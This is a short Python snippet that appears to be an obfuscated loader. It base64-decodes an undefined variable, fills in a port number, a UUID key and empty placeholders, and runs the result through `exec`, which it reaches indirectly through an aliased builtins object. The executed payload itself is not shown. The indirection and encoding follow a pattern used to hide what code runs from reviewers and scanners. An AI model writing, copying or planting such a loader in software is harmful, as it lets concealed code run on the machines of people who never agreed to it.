import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "91c5a917-b9d6-42d5-9f60-457a8135d5c8")
    .replace("__vl__", "")
    .replace("__vm__", "")
    .replace("__tr__", "")
)